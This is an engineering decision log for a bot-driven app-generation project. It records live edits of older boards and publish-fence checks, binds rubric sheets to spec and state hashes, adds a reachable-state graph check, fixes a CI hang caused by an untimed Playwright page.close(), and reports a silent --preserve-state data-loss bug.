  `chat/~zod/dash-ezw1rkiq` — `srf-chess-leaderboard`, a 6a.5-era board sitting
  at revision 3 for weeks, in `~zod/surface-seed`. Nothing in this session's
  context produced it.

  **Request:** _"In the Surface seed group's chess leaderboard, add each
  player's current streak of wins to their row."_ Imperative and
  group-qualified, both decided by the verdict run rather than chosen here —
  interrogative phrasing produced a byte-identical no-op there against the same
  witness and target, and an app named without its group was published to a
  same-named board elsewhere.

  **Preflight: ABSENT on all four surfaces.** Both pattern sets passed their
  two-sided self-test, and the negative that matters was
  `"Running total: 1 points · 1 game"` — it contains _Running_, so a witness
  reaching for a bare `run` would have refused a request the board genuinely
  does not satisfy. The action negatives are the whole live action map
  (`report-win`/`draw`/`loss`), which are the near-misses a witness reaching
  for `win` would have matched.

  **The confound, recorded in the request record BEFORE the run and committed
  before the result was known.** This session added a `leaderboard` TEMPLATE
  hours earlier and the bot can read it. So regeneration was the CHEAP path — a
  close template sitting in the skill — while the board itself was the thing the
  loop had to go and read. That inverts the verdict run's condition, where four
  of six edits were on apps the loop had generated minutes before from templates
  it had just read.

  **Result: a purely additive local edit.**

  |                   |                                                 |
  | ----------------- | ----------------------------------------------- |
  | line survival     | **100%** — all 64 original lines kept, 4 added  |
  | word survival     | **100%** — all 326 original words kept          |
  | actions           | 3 → 3, all kept by id, none dropped, none added |
  | surfaceId         | unchanged; revision 3 → 4                       |
  | time to published | 180s                                            |

  The diff adds a `resultsByPlayer` accumulator inside the EXISTING `add`
  closure — reusing the iteration already there rather than adding a pass — and
  one render line computing the trailing run with a reduce that resets to zero
  on a non-win. **It declared no new action**, which is what the doctrine
  prescribes for a derived value and what the witness's deliberately
  hypothetical `actionPositive` anticipated: a correct implementation of a
  streak has no action at all.

  **And the app works**, checked because D140 is the standing reason not to
  stop at the diff: the painted render shows `~zod` (one win) at
  `Current win streak: 1` and `~ten` (one draw) at `0`; twelve cells, no shell
  errors, no unprobed cells, no machine defects; gate clean.

  **The fence's permit path is now exercised live.** The binding flowed from
  the preflight's `binding.json` into the container's scope file — channel,
  pre-state sha, and `~zod/surface-seed` alone — and the bot published to the
  bound channel and nowhere else. Its refuse path was exercised separately
  (four fake-ship controls, plus a live out-of-scope publish that refused naming
  both). D131's "the fence is not a stop-work order" arm is no longer only a
  unit test.

  **What this is not.** It is n=1. The behaviour is additive and small, and a
  structural change against an aged board might behave differently — the
  verdict run's one no-op and the kanban's poor design choice both came from
  harder requests than this. What it does settle is the specific residual D130
  left open: the loop's edit behaviour is not an artefact of revising apps it
  had just written, because here it edited a stranger while a tempting
  regeneration target sat in its own skill directory.

## Session 6c — closing out M2

### Provisioning, closed

- **D150: both M0 provisioning items were satisfied by production
  infrastructure the whole time, and were carried as "the hard dependency" for
  four sessions without anyone probing them.**
  The moon's storage write is provided by memex's design — a moon's uploads
  resolve to the parent planet's storage, and `tlawn.py` already sets
  `%presigned-url` and `TLON_HOSTING=1`. The moon **is an admin of the user's
  personal group** at onboarding; verified live on a hosted ship by Patrick,
  2026-09-01.

  The dev-storage stub and the seed's role grant were stand-ins **for
  fakeships**, never for production. That distinction is the whole error: a
  local workaround was read as evidence that the real thing was missing, and
  the reading was repeated in every report from Session 5 onward — including
  6b's _"the moon→storage grant and the admin role — unchanged and still the
  hard dependency"_ — without one probe against a hosted ship. The cost of the
  probe was a question to someone with a hosted ship. The cost of not asking
  was four sessions of a blocking item that was never blocking.

  Generalisable, and the reason this is a decision and not a status update: a
  dependency inherited from a prior session's report is inherited as a CLAIM,
  not as evidence. It gets a probe the first time it is load-bearing, or it
  gets labelled as unverified. This project has a rule for guards — exercise
  the mechanism through the path the real actor uses — and this is the same
  rule pointed at an assumption instead of an assertion.

- **D151: the D149 record was written to a path that did not exist, and the
  commit that claimed it did not contain it.** `d1803fb194` is titled _"docs:
  the aged-board revision"_ and contains the session report's §7 — but
  `git show HEAD:DECISIONS.md` ended at D148, and `grep -c D149 DECISIONS.md`
  returned 0. The 70 lines had gone to an untracked
  `packages/tlon-skill/DECISIONS.md`, created silently by a relative path
  resolving under a `cd` that persisted from an earlier command. Recorded, not
  merely fixed, because the failure is invisible by construction: writing a
  file always succeeds, and the session that wrote it reports success. The
  check is `grep` from the repo root against the tracked file, and it costs
  nothing.

- **D152: the cwd-dependent gate failure stays recorded as unreproduced, with
  its symptom named so a recurrence is diagnosed rather than rediscovered.**
  The class was fixed — a gate failure caused by the environment now reports
  `gate-harness-unavailable` and tells the author _"Your files are not
  implicated — do not rewrite the app. This is the gate's environment, not the
  bundle"_ — but the cause was never reproduced after a `dist` rebuild, and is
  not claimed. **The symptom to watch for:** the gate failing for a template
  that passes from the package directory but not from the repo root, with
  `Attempting to define property on object that is not extensible`. If that
  returns, it is this, and the first thing to check is which `dist` the run
  resolved.

- **D153: `surface publish` uploads through the same hosted helper the CLI's
  image upload uses; there is no second upload path to fail on a hosted moon.**
  `surface-publish.ts:1017` → `deps.uploadBundle` → `uploadBundleToShipStorage`
  (`surface-runtime.ts:308-322`) → `uploadFile` from `@tloncorp/api`. The CLI's
  image upload reaches the identical helper by
  `upload.ts:329` → `deps.uploadApi.uploadFile` → the same
  `packages/api/src/client/storageApi.ts:195`. Both pass
  `hostedDetection: 'assume-hosted'` when `TLON_HOSTING` is set, and the helper
  forces the memex branch (`storageApi.ts:221-225`), which PUTs to a presigned
  URL and never constructs an S3 client. So the production moon's lack of S3
  credentials — by design — is not a problem publish has to solve, and the
  `assetRef` is the public URL clients fetch. Checked by reading because the
  claim is about which function is called, and reading is the direct evidence
  for that; what reading does NOT establish is that a hosted moon's publish
  succeeds end to end, which needs the first rollout ring.

### The CI wedge, root-caused and the earlier belief corrected

- **D154: the browser tests did not wedge on repeated `chromium.launch()`; they
  wedged on an untimed `page.close()`, and the trigger is mixing `Bun.spawn`
  with an in-process browser in one bun process.**
  The recorded belief going in — carried from the templates suite, where seven
  in-process browser passes were fixed by one subprocess per template — was
  that Chromium exhausts after several sequential launches. **That is refuted
  for `surface-preview.test.ts`**, by measurement rather than argument: three
  sequential in-process launches pass 3/3 in 26s with the determinism control
  filtered out. A tracing proxy around the launcher located the hang inside
  `page.close()` — Playwright's `Page.close()` is `this._channel.close()`, a
  raw protocol call with **no timeout**
  (`playwright-core/lib/client/page.js:509-522`) — so a browser that stops
  answering hangs forever and bun's 120s deadline is the only thing that ends
  it.

  | sequence                                         | result   |
  | ------------------------------------------------ | -------- |
  | 3 in-process launches, no spawn                  | PASS ×3  |
  | spawn, then 1 in-process launch                  | PASS     |
  | in-process launch → 4 spawns → in-process launch | FAIL 2/2 |

  The mechanism inside Bun/Playwright is **not** claimed: it is consistent with
  `Bun.spawn` perturbing the fd bookkeeping Playwright's pipe transport depends
  on, and that was not proven.

  **Why it hid for two green runs.** The file already contained a spawn arm —
  the determinism control's private `captureInSubprocess` — sitting between two
  in-process browser tests. So the file had carried the pattern since that
  control was written and passed on luck; it reproduces locally 2/2, and was
  never CI-only. Nobody had run that file by itself.

  The fix routes all four browser tests through one shared
  `previewInSubprocess()` and collapses the private spawn helper into it, so
  the mix cannot be reintroduced by a browser test appended later. Three
  consecutive full runs of the exact CI invocation: `89 pass, 0 fail, 379
expect()` at 142.17s / 141.99s / 142.65s. Mutation-checked — pointing the
  "finds nothing in the poll fixture" arm at `DEFECTIVE_BUNDLE` fails it with
  the full 74-line defect diff, so the subprocess path really drives a browser
  and the manifest survives the process boundary.

  **Two general lessons, both cheap and both earned here.** First, a diagnosis
  inherited from a similar-looking failure is a hypothesis, not a cause; this
  one survived a session only because nothing had tested it. Second, a test
  file that passes in a suite and has never been run alone has not been
  measured — the isolation run is the cheapest experiment available and it
  reproduced on the first try.

### The `ListRow` secondary slot

- **D155: `secondary` takes NODES and owns the supporting cluster's rhythm,
  because in three of the five three-line rows the third element is not text.**
  The obvious design — a single muted text line, with anything further left
  hand-rolled — is unavailable: habit-tracker's facepile, workout-tracker's
  deload badges and leaderboard's `Progress` bar are the third child, and
  `secondary` renders AFTER `children`, so leaving them in `children` floats
  them above the supporting text. The "two equal-weight lines rebuilds the
  problem" objection does not apply, because the missing hierarchy is
  title-vs-supporting, not supporting-vs-supporting: "3 of 4 today" and
  "✓ · ✓" are peers and should render as peers. Styling reuses the existing
  `--text-s` / `--color-text-secondary` / `--line-s` / `--space-2xs` set; the
  muted type is set on the container, so `Avatar`, `Badge` and `Progress` keep
  their own color and size.

  Thirteen sites across eight templates; `poll` was already correct and is
  untouched.

  **The exception is written into `PRIMITIVES.md`, not left to a comment.**
  `kanban`'s card puts three wrapping move-buttons in `secondary` rather than
  `right`, because in the trailing slot they take most of a phone's width and
  crush the content column to a word a line. A comment in the one template that
  does it is the wrong instrument — the bot copies template code far more
  readily than it obeys a comment — so the rule now lives where the bot reads
  rules: controls go in `right`; a wrapping cluster of three or more is the
  exception; **and the fact that a `Button` in `secondary` keeps its own color
  and therefore looks fine is exactly why the rule has to be stated rather than
  left to the eye.**

### The rubric sheet binds the spec, not only the bytes

- **D156: a rubric sheet now binds `(surfaceId, bundleSha256, specSha256)`, an
  artifact without the spec hash is refused outright, and 17 existing publish
  tests broke — which is the evidence that the hole was live rather than
  theoretical.** Each of those 17 was a spec-only change (a title rename, a
  `preserveState` flip, an added undeclared key) passing on a stale sheet. The
  plan had carried this as a known residual since Session 6b.

  **No lenient path, and the argument is sharper than "be strict":** the
  lenient path's bypass is `delete sheet.specSha256`. A binding an author can
  satisfy by REMOVING a line is not a binding. There is also nothing honest to
  migrate to — the field is a claim about what the scorer was looking at, so
  filling it in from the current spec would be the tool asserting the very
  thing it exists to verify.

  **D72 (raw-to-raw) is honoured and proved, not asserted.** The hash is
  `sha256(canonicalJson(spec))` over the VERBATIM parsed spec at all three
  ends, never the validated view — `canonicalJson` (D109) preserves every own
  enumerable key and erases only key order and `undefined` values, neither of
  which can reach a channel description cell. So every difference it hides is
  one no reader could observe, and every difference a reader could observe
  moves the hash. The distinction is executable against the real
  `SurfaceSpecSchema`: `surfaceSpecHash(raw_with_undeclared_key) !==
surfaceSpecHash(raw)` while `surfaceSpecHash(parse(a)) ===
surfaceSpecHash(parse(b))`. If anyone moves the hash onto the validated view,
  that assertion is what fails.

  Two mutations, both verified applied: deleting the spec comparison fails
  exactly six tests across publish and fork and nothing else; accepting a
  missing hash fails exactly the four compatibility tests. The positive
  controls are deliberately separate so a refuse-everything guard cannot pass
  — including one asserting that key REORDERING does not invalidate a sheet.

  **This is not fork-local.** `requireCompletedRubric` is shared, so publish now
  refuses a spec-only revision on a stale sheet exactly as fork does.

- **D157: the sheet binds the STATE the captures opened on as well, stamped
  unconditionally, and compared as a state rather than as a flag.**
  `surface preview --state <file>` renders the twelve cells from a supplied
  state, and nothing bound it — so a sheet could name the right bundle and the
  right spec while its images came from a starting state the spec never
  produces. Reachable through the bot's own documented workflow rather than a
  corner case: `RUBRIC.md:301` instructs the scorer to do _"a separate
  `--state` run against the example board"_, and `countdown/NOTES.md:170` says
  the `--state` run is _"the only run that exercises 'Passed'"_. The sheet a
  human actually fills in for `countdown` was the unbound one.

  Three details earn their place:

  **`stateSha256` is stamped unconditionally, not only for an override.** If it
  were absent in the ordinary case, "no override happened" and "the field was
  deleted" would be the same shape — the satisfiable-by-omission hole the
  binding exists to close, reintroduced by the binding itself.

  **The comparison is on the state, not on `stateSource`.** An override that IS
  the spec's own `initialState` passes, because those are the same pixels. A
  cheaper "refuse any override sheet" would pass the negative test and fail
  that one, which is exactly why that arm exists.

  **One hasher, not two.** `surfaceSpecHash` generalised to
  `surfaceCanonicalHash` and renamed at all six call sites: what is hashed
  differs per call site, how it is hashed does not.

  Mutations, both verified applied: deleting the state comparison fails exactly
  the three comparison-dependent controls; accepting a missing `stateSha256`
  fails exactly the four provenance-required tests.

  **The eval probe is a reader, not a gate, and is tolerant on purpose.**
  `surfaces-eval-probe.ts` validates historical rubric recordings that predate
  these fields. Regenerating recorded evidence to satisfy a new check would
  destroy the record, and reporting a historical artifact as `rubric-incomplete`
  would be an author-classed error for something no author did. It now filters
  exactly those three complaints and reports `predatesBindings`, while a sheet
  that also left cells blank is still incomplete. The comment says why this is
  correct here and a loophole in publish, so nobody later "fixes" it into
  strictness.

  **The residual, named rather than buried.** Under `--preserve-state` the
  channel never reads the new `initialState`, so the useful preview is the
  `--state` run against live state — and that sheet is now refused, meaning a
  preserving revision's sheet certifies the board the app OPENS on, which is a
  board nobody will ever see. Binding to the carried state instead was
  considered and rejected: that state is a property of the channel, not of the
  write, and it moves whenever a member acts, so the guard would refuse correct
  work. The uniform rule has a remedy (one extra plain preview run); the
  alternative has none. But the residual is the same species as the defects
  this session exists to fix — a human scoring images that do not correspond to
  what ships — and the real answer is to score the `--state` run and bind it to
  a state the channel PROVABLY held, verifiable by folding the post log. That
  is machinery, not a paragraph, and it is the top candidate for next session.

### The transition graph — the class fix for rubric check 7

- **D158: `surface preview` now walks the reachable-state graph, and kanban-v2 —
  the app check 7 passed — draws the mandatory-checkpoint defect from a closed
  4096-state walk in ~2.1s.**

  Check 7 had passed three defects, and D140 named the common structure: every
  one is about what happens when you PRESS something, and check 7 is scored from
  a still image. The preview matrix renders states and never transitions.

  **The design, and why it costs so little.** Edges come from the real client
  reducer; the browser is used only to learn which controls a state renders.
  Actions are parameterless, so a transition is a pure function
  `state + actionId --reduceSurface--> state'`. The edge set out of a state is
  **the actions the controls rendered in THAT state actually invoke** — not the
  declared action list. That single distinction is the whole difference from
  what the gate already did: `surface-lint.ts` does a depth-1 STAR walk
  (initial, then each declared action folded once from initial), so a control
  that appears two presses in is indistinguishable from one that appears never.
  The walk runs in happy-dom through the same fixture runner the gate uses, so
  none of it is browser-gated.

  `activateControls` and its recorder were EXTRACTED from `surface-lint.ts`
  (506 lines moved, one behavioural change: a `Collector` argument became an
  `onProblem` callback), not reimplemented. A parallel copy would have been the
  defect this pass exists to find, in the pass itself.

  **Mandatory checkpoint = dominance, computed on PROJECTED graphs, and the
  soundness argument was checked rather than assumed.** For pointer p with
  projection π, every explored edge S→T contributes π(S)→π(T), so the image of
  any real path is a walk in the projection. If u dominates v in the projection
  and some real path reached π(S)=v touching no u-valued state, its image is a
  walk to v avoiding u — contradicting dominance. Dominance transfers **because
  the projection over-approximates paths.**

  **Two ways to break that, one of which nobody had named.** Truncation is the
  obvious one: a truncated walk projects FEWER edges, and a missing edge is
  exactly the bypass — so findings are gated on `closed`, and a truncated run
  prints checkpoints as observations that assert nothing. The second was found
  while building it: **value-domain overflow drops values, so some states
  project to nothing and their edges vanish — an UNDER-approximation, the one
  direction that is unsound.** Overflowed projections are skipped. The same
  reasoning caught a third case: a handler calling `invoke()` twice produces a
  state a one-fold-per-press walk has no node for, so multi-invoke presses are
  counted, become a shortfall, and a shortfall makes the graph not-closed.

  **The controls, in both directions.**
  `kanban-v2` (vendored as a tracked fixture, since the verdict-run artifacts
  are gitignored evidence that exist on one machine) draws
  `"done" at /tasks/*/status is reachable only through "doing", then "blocked"`.
  All 24 of its declared actions are reachable: **the defect is the ORDER, not
  a missing control**, which is exactly what a still cannot show.

  The unreachable-action control had to be BUILT. The prompt assigned it to the
  6a.5 inert expense app, which ships `actions: {}` with zero `invoke(` sites —
  so "every declared action no control reaches" is the empty set and the
  control would pass vacuously, and worse, that app is structurally identical
  to the shipped `countdown` template under this pass. Any rule firing on it
  fires on a template. Built instead: a sheet whose `reopen` button renders
  only when `/closed` is true and nothing ever sets `/closed`. Its positive
  twin changes one condition, and **its edges all originate at depth 2** —
  which is the point, since the gate's depth-1 walk cannot see a control two
  presses in.

  Nine templates draw nothing and **eight of nine close**, so that result is an
  assertion rather than a truncation dodge. `kanban` writes `/claims/$actor` on
  every move, so its space is 24577 states; it truncates and therefore asserts
  nothing, said plainly. A test pins that **at most one** template may truncate,
  so a change making everything truncate — which would make the clean result
  vacuous — fails.

  The synthetic negative controls did their job the hard way: the first
  bypass-graph assertion ("no checkpoint at all") FAILED, correctly — Doing
  really is still mandatory on that graph — and the assertion was fixed rather
  than the code, with a third graph added as the true zero-finding control. In
  the other direction a scorer that flags everything is asserted to FAIL the
  clean-template check, so "the templates draw nothing" is a property of the
  templates and not of an empty report.

  **What it cannot see, printed on every run including clean ones:** whether the
  reachable states are the states the REQUEST implies (nothing here has access
  to the request — check 7 stays a human check, now scored against a
  reachability report instead of a still); anything a control does that is not
  `invoke`; a second member (every press is one ship); the other theme and the
  read-only screen; anything the host does via `--host-ops`; and whether a
  reachable screen is any good — reachable and legible are different questions.

- **D159: D136.6 is ruled — neither side was wrong, and the thing that forced
  them into contradiction was lint's depth-1 blindness.**
  The skip rule treats an unpressed control as a MEASUREMENT gap (four rules are
  silent about a handler that never ran, and calling that a clean pass is the
  failure the skip discipline exists to prevent). The template test treats any
  skip as a defect of the app, which is a fair bar for a golden exemplar. Both
  are right. What neither states is that lint activates at depth 1 only, so
  "reachable in two presses" and "unreachable" are the same observation to it.

  With the graph, the three cases separate: a control gated on a MEMBER action
  is reached, pressed and scored — **no skip**; a control gated on a HOST event
  is reached once the walk is seeded with host ops; and a control **no reachable
  state renders** is a real `unreachable-action` violation rather than a skip.
  The spare-cost-slots pattern becomes buildable as a template under an
  UNCHANGED `skipped: []` assertion — nothing had to be relaxed, which is what
  says the ruling is right rather than merely decisive.

  **The gate was NOT rewired onto the graph, deliberately.** Every behavioural
  rule inspects each rendered state, so a gate on the real graph would inspect
  4096 states on a board like D140's, on every publish. That is a different
  gate. Instead both signals now say which question they answer, and the precise
  fact was written into the gate's own doc: lint's star walk renders states **no
  member can reach**, so an action invoked only from one of those counts as
  reached by lint and unreached by the walk. **Neither set contains the other.**
  Lint's is a fact about the gate's coverage; the walk's is a fact about the app.

  **Honest caveat on the host-event leg:** D70 built the `--host-ops` flag on
  `surface preview`, but templates ship `app.js`, `spec.json`, `NOTES.md` and
  `state.json` and carry no host-ops seed. That leg needs a per-template seed
  file that does not exist yet. No current template uses the pattern, so nothing
  is blocked; the member-gated leg, which is the one that resolves the
  contradiction, needs nothing new.

### The CLI the bot invokes, and whether it contains the work being measured

- **D160: the harness now refuses to measure a CLI compiled from different
  sources than the worktree holds — and when the guard was first run, the
  answer was DIFFERS.**
  The bot drives `packages/tlon-skill/bin/tlon`, a `bun --compile` binary built
  by `build-local-skill-override.sh`. It is compiled from source at build time,
  not run from source at invocation. Today's binary predated **16 compiled
  `.ts` files, 13 of them in the traced import closure** — including
  `surface-transitions.ts`, `surface-activation.ts`, `surface-rubric-artifact.ts`
  and every `commands/surface-*.ts`. A live run would have measured a CLI
  containing none of this session's work, and nothing would have said so.

  **This is D135's hole one level up, and the fence probe provably cannot close
  it.** `assertFenced` proves the write fence is real by probing a malformed
  scope file, an absent one, and a no-scope control. The fence already existed
  when this binary was built, so a stale binary passes all three. The guard
  verified the instrument and said nothing about whether the actor carried the
  work. That is the same sentence written about 6a.5's stale-binary guard, and
  it recurred because the remedy was again scoped to one artifact.

  **Built on the precedent already in the repo, not a new idiom.**
  `surfaces-desk-preflight.mjs` solves the identical problem for the Hoon desk:
  digest a source tree, compare it to what is deployed, refuse with a named
  remedy. Same shape here — the build stamps a content digest sidecar next to
  the binary; the preflight recomputes and refuses on mismatch, naming the
  drifted files.

  Three details that decide whether it works:

  **Contents, never mtimes.** mtime is not a real discriminator (D138): a
  checkout produces old mtimes on new content.

  **`skills/**` is EXCLUDED.** Templates, `SKILL.md`, `PRIMITIVES.md` and
  `RUBRIC.md` are read from `TLON_SKILL_DIR` at runtime as data, not compiled
  in. If a template edit demanded a rebuild the guard would cry wolf during
  ordinary work, and a guard that cries wolf gets disabled. It has its own
  control: editing all three doctrine files and a template together leaves the
  digest byte-identical.

  **The stamp names the binary as well as the sources**, because a certificate
  can outlive its artifact. The hash is taken INSIDE the container at the exact
  path the bot's tool call resolves — the project's own rule turned on the
  guard itself — which also asserts the bind-mount identity instead of assuming
  it. And the prebuilt/npm path DELETES any standing stamp before overwriting
  the binary, so an interrupted hydrate cannot leave an old certificate over new
  bytes.

  The file set was **traced, not assumed**: 61 files reachable from `main.ts`,
  zero of them `*.test.ts`, no unresolved specifiers. The shipped glob is
  deliberately broader than the closure by 11 files, because the two failure
  modes are not symmetric — an over-broad set costs a rebuild nobody needed, an
  under-broad set is a silent blind spot of exactly the kind this exists to
  close.

  **Known gap, recorded rather than closed:** `@tloncorp/api` and
  `@tloncorp/surface-shell` are compiled into the binary and are outside the
  digest — `packages/api`'s subpath exports resolve to `src/**/*.ts`, and the
  closure pulls 8 such subpaths plus 4 from surface-shell, which this session
  modified. Drift there still goes unreported. The obvious next widening, and
  it needs `packages/api`'s `dist`-vs-`src` split decided first.

- **D161: check 7's sheet entry carries a machine-stamped reachability line,
  and a walk that did not finish cannot be mistaken for one that found
  nothing.** Three markers, weakest claim first: `not walked:` (never ran),
  `not measured:` (a bound was spent, OR a control could not be pressed — a
  shortfall is a missing edge, and a missing edge is the one thing dominance
  cannot survive, so it disarms the citation exactly as truncation does), and
  `measured:` (a closed walk only, and only then may it report "nothing").

  Stamped unconditionally and required by the validator, for the reason D157
  gives: optional is precisely how "we did not walk it" and "we walked it and
  it was fine" become one emission. `buildRubricTemplate` takes it as a
  REQUIRED argument and derives the line itself, so a forgetful caller is a
  compile error rather than a publish-time refusal.

  The marker list is a fixed enumeration checked the way `stateSource` and
  `verdict` already are — deliberately not the keyword heuristic this file
  refuses elsewhere: **a stamp can be checked for having come from the machine;
  a note cannot be checked for being a good note.** And the validator does not
  import `surface-transitions.ts` — publish must not pull in happy-dom and the
  reducer to validate a text file, so the citation builder takes a structural
  input the report already satisfies.

- **D162: the pre-binding tolerance list is a hand-maintained mirror of "fields
  added to `RubricArtifact` since these recordings were made", and nothing makes
  growing the artifact fail loudly — which is how it broke within a day of being
  written.** D157 gave `surfaces-eval-probe.ts` a scoped tolerance for rubric
  sheets recorded before the new bindings, because it reads historical
  recordings rather than gating a write. Hours later, and by a different hand,
  check 7 gained a required `reachability` citation (D161). The tolerance list
  did not grow with it, so that one complaint survived the filter and
  `dev/surfaces-score.test.mjs`'s `NEGATIVE CONTROL — the clean run scores as
clean` began failing: every axis passed except `rubric`, on a fixture whose
  sheet carries `bundleSha256` and none of `specSha256` / `stateSha256` /
  `stateSource` / `reachability`.

  **A framing this file briefly carried, corrected here rather than quietly
  deleted:** the failure was first read as one reader having been taught an
  exception the other had not. That is wrong. `surfaces-score.mjs` does not
  validate anything — it spawns the probe as a subprocess and renders its JSON,
  so the tolerance was single-sourced by construction and there was never a
  second copy to keep in step. The real defect is a list that must be extended
  by hand every time the artifact it mirrors gains a field, with no mechanism
  tying the two together.

  **The remedy is named and NOT built**, deliberately: a check that the probe's
  tolerance list covers every artifact field absent from the recordings would
  close it, and that is a new mechanism rather than the one-line fix that was
  blocking a push. Recorded as the thing to build the next time the artifact
  grows — because the failure mode is a **fabricated author-error on four
  historical sheets**, which is exactly the class of error this project refuses
  to emit.

  Two things found on the way, both worth keeping. The earlier tolerance edit
  had also dropped `problems` from the emitted rubric object, and the scoreboard
  renders that as the axis's detail line — so every failing rubric axis would
  have reported a failure with nothing said about why. And `dev/surfaces-score.mjs`
  contains two `\u0000` bytes as deliberate hash field separators, so `file`
  calls it binary and plain `grep` prints **nothing at all** rather than no
  matches; `grep -a` works. That silently swallowed a search during this
  investigation and will swallow the next one.

  The reason any of it surfaced is that this project builds negative controls:
  nothing else in the suite would have noticed a clean run quietly scoring one
  failure. A guard asserting that a clean thing stays clean is the cheapest
  instrument here, and it has now paid twice in one session.

- **D163: asking for a source build and not getting one was reported as though
  the operator had not asked — and that is how the binary went stale.**
  `build-local-skill-override.sh` guarded its source path on
  `command -v bun`. In the container bun lives at `~/.bun/bin` and is **not on
  the default PATH**, so under `docker exec` the check fails while bun sits
  right there. The script then fell through to the prebuilt npm binary and
  printed _"Using prebuilt tlon-skill binary (set TLON_SKILL_FROM_SOURCE=1 to
  rebuild from local source)"_ — with `TLON_SKILL_FROM_SOURCE=1` already set.

  Found by running it: the first rebuild attempt of this session took the
  prebuilt path and replaced a stale-but-branch-derived binary with the last
  RELEASE, which carries none of the surfaces work at all. The message made
  that read like a choice nobody had made.

  Two changes, and the second is the one that matters. The script now finds
  `$HOME/.bun/bin/bun` when bun is not on PATH. And **a requested source build
  that cannot run is an ERROR with a non-zero exit, never a silent
  substitution** — because the prebuilt binary is the last release, so a run
  taken against it measures something that says nothing about the branch.
  Reporting an environment failure as an operator choice is the same confusion
  `gate-harness-unavailable` exists to prevent one layer down: say which it is,
  and refuse rather than substituting something that looks like what was asked
  for.

  Controls, both directions, on the real container: with bun hidden and
  `TLON_SKILL_FROM_SOURCE=1` set it exits 1 naming PATH and refusing; with the
  default PATH it now finds bun and builds from source unaided. The rebuild is
  byte-identical across two independent runs (binary `9cbc22d03571`, digest
  `a276f35bfce3`), so the build is deterministic as well as current.

  D160's guard then verified on the real tree rather than a copy: CURRENT after
  the rebuild, STALE naming `scripts/surface-runtime.ts` when one source is
  touched, CURRENT again on revert.

### The second aged-board revision, and the metric it broke

- **D164: the revision is a minimal, correct, behaviour-changing EDIT — and the
  word-survival metric classified it as a REGENERATION. The metric is wrong,
  and that is the finding.**

  `chat/~zod/dash-lihku4fx` — `srf-climbing-sessions`, a cold 6a.5-era board in
  `~zod/surface-seed`, revision 2. Request, imperative and group-qualified:
  _"In the Surface seed group's climbing sessions board, order the climbers by
  who climbed most recently and show when each of them last climbed instead of
  their session count."_ Preflight ABSENT on all four surfaces beforehand.

  |               |                                                  |
  | ------------- | ------------------------------------------------ |
  | line survival | 67.7% (67 of 99)                                 |
  | word survival | **67.3%** (206 of 306) — below the 70% threshold |
  | actions       | 1 → 1, kept by id                                |
  | surfaceId     | unchanged; revision 2 → 3                        |
  | bytes         | 3395 → 3405                                      |

  **Why the label is wrong.** The 70% threshold was calibrated on ADDITIVE
  requests — D149's scored 100% because nothing had to be removed. This request
  was behaviour-CHANGING, and "rank by total, show count" cannot become "rank
  by recency, show date" without deleting the accumulator and both of its
  display sites. Every changed region maps onto a clause of the request:
  `totalFor` → `lastClimbed`, an alphabetical sort → a recency comparator, two
  `right=` badges, the card title and empty-state copy, and the removed
  trailing `Stat`. The `LOG` helper, the `has` helper, the `register` shape,
  the Card scaffolding and the sole action are byte-identical.

  So the generalisable claim is not about this app. **Word survival conflates
  how much text changed with whether the loop regenerated, and it stops
  discriminating exactly where the request requires deletion.** A metric that
  reads a minimal correct edit as a rewrite cannot be used to defend the format
  verdict against behaviour-changing requests — which are most real revisions.
  D130's evidence was twelve observations, and it is now known that all of them
  were of the shape this metric can measure. That is a limit on the evidence,
  not a reversal of it: nothing here suggests the loop regenerates, and the
  structural markers all say edit.

  **What a better discriminator would key on**, recorded rather than built: the
  survival of code the request does NOT implicate, plus the structural markers
  already collected (surfaceId, action ids, untouched helpers byte-identical).
  Building it needs a way to decide "implicated", which is a judgement the
  measurement currently outsources to a threshold.

  **The app works, checked rather than assumed** — D140's standing reason not
  to stop at the diff, and here the check is unusually strong: the SAME witness
  that returned ABSENT before the run returns **PRESENT** after it, matched at
  `"Last climb"`, with all five negatives still unmatched so it is not matching
  by accident. Painted text: `"… ~ten2026-08-31 ~zod2026-08-31 Last climbed
~ten2026-08-31 ~zod2026-08-31"` — counts gone, dates in their place, footer
  removed.

  **The pre-registered caveat held.** Both climbers tie on `2026-08-31`, so the
  ordering half is unobservable in the render; that was written into the record
  before the run, not discovered after it. The ordering is verifiable only by
  reading the comparator, which is implemented correctly.

  **One honest debit:** the edit also extracted a `peopleIn` helper the request
  did not ask for — about five lines of unrequested refactor.

  **The confound, as pre-registered, pointed toward regeneration and did not
  produce one:** `habit-tracker`, added hours earlier, is a structural twin of
  this board and a near drop-in donor. The loop edited the stranger anyway.

### The nine-template live loop

- **D165: nine of nine templates published and took a member interaction
  observed by scry, and the loop found a silent data-loss bug that every check
  in the pipeline reported as success.**

  All nine ran in `~zod/umnjhaod` from one-sentence requests, bot-driven, with
  the fence bound to that group alone. No bot turn came near the 300s cap; the
  slowest was 133s. `countdown` is carved out of the member-interaction
  requirement by its own declaration, as decided before the run and not after.

  **The bug: `--preserve-state` silently discards a revision's new
  `initialState` fields.** It posts a migration snapshot of the PRE-revision
  state, and the reducer serves that snapshot instead of `initialState`, so
  anything the new spec adds there is never consulted. Confirmed on
  `chat/~zod/ski-trip-expenses`:

  ```
  spec @ revision 2   itemOrder: ["house","van","food","ferry","lift"]  + action paid-lift
  LIVE state          itemOrder: ["house","van","food","ferry"]
                      baseSnapshotSeq 3 = newestFoldedSeq 3, foldedEventCount 0
  ```

  Lint passed, publish passed, the read-back confirmed the description carries
  exactly the new definition. `paid-lift` is a declared action writing to a key
  nothing draws.

  **What makes it a trap rather than a bug.** Four other templates took the
  identical shape and worked — poll, potluck, habit-tracker, leaderboard — but
  ONLY because the bot also posted a host event writing the new field into live
  state (`foldedEventCount ≥ 1` after the snapshot). Nothing in the pipeline
  requires that compensating event. Whether a revision lands is currently down
  to whether the model remembers, and the four successes are what would make
  anyone conclude the path works.

  **It is not evenly distributed, and that is the connection worth keeping.**
  The templates that need new-field revisions at all are the ones whose ITEM
  SET must grow — expense-split, potluck, kanban. Poll and rsvp never reach
  this path because their options are fixed by the request. So v0's
  parameterless-action constraint routes exactly those three templates onto the
  one path in the pipeline that fails silently.

  **Two smaller findings.** A re-ask after a clarifying question created a
  SECOND channel with the same title rather than publishing into the one it had
  just made (`dash-5hi7zfn3` orphaned, `spec-absent`; `ski-trip-expenses`
  published) — adjacent to D50's burned-name discipline and not covered by it.
  And `surface preview` injects a fixed `now = 1735689600000` (2025-01-01), so
  a countdown targeting Oct 2026 is rubric-scored at "652 days", a number no
  member will ever see: deterministic by design, and a hole in what check 7 can
  mean for a time-display app.

